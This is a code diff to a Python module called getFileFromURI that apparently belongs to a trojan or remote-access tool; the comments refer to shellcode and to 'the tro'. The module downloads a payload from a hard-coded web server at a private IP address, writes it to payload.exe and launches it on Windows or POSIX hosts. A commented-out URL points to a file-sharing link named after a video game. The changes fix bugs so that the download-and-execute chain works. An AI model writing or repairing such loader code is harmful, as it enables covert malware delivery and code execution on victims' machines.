@@ -20,13 +20,13 @@ except:
   import urllib3
 
 # retrieve the shellcode from our web server
-url = "http://172.16.222.149:8000/payload.exe" #"https://dc619.4shared.com/img/mSMvaperce/s23/1542cfad648/Dragon_Ball_Z_Shin_Budokai_2" #
+url = "http://172.16.222.149:8000/test" #"https://dc619.4shared.com/img/mSMvaperce/s23/1542cfad648/Dragon_Ball_Z_Shin_Budokai_2" #
 bin = True
 OsTargetpath = "payload.exe"
 start = True
 
 def run(**args):
-	print("[*] In getFileFromURI module.") #Todelete
+  print("[*] In getFileFromURI module.") #Todelete
   response=""
   #while not is_connected(): #if the tro execute this, so it is connected
   #time.sleep(20)
@@ -34,24 +34,22 @@ def run(**args):
     http = urllib3.PoolManager()
     r = http.request('GET', url)
   except urllib3.exceptions.MaxRetryError:
-  	os.system("echo 'getFileFromURI: HTTP Error 404: File not found' >> Tapalog.log")
+  	print("echo 'getFileFromURI: HTTP Error 404: File not found' >> Tapalog.log")
   	return "getFileFromURI: HTTP Error 404: File not found"
   except urllib3.exceptions.URLError: 
-  	os.system("echo '<urlopen error [Errno 111] Connection refused>' >> Tapalog.log")
+  	print("echo '<urlopen error [Errno 111] Connection refused>' >> Tapalog.log")
   	return "getFileFromURI: Connection refused"
-  else:
-  	return "getFileFromURI: Connexion error"
   # decode the shellcode from base64
   shellcode = r.data  ####shellcode = base64.b64decode(r.data)
   
   if bin:
     mon_fichier = open(OsTargetpath, "wb")
-    mon_fichier.write(shellcode.__str__())
-  	mon_fichier.close()
+    mon_fichier.write(shellcode)
+    mon_fichier.close()
   else:
     mon_fichier = open(OsTargetpath, "w")
-		mon_fichier.write(shellcode.__str__())
-		mon_fichier.close()
+    mon_fichier.write(shellcode.__str__())
+    mon_fichier.close()
   if start and os.name == 'nt':
           os.system("start {}".format(OsTargetpath))
   elif start and os.name == 'posix':
@@ -61,7 +59,7 @@ def run(**args):
           os.system("echo 'Non-recognized OS' >> Tapalog.log")
       
   time.sleep(5)
-  return str("getFileFromURI: file {} successfully started".format(filePath))
+  return str("getFileFromURI: file {} successfully started".format(OsTargetpath))
 
 
 
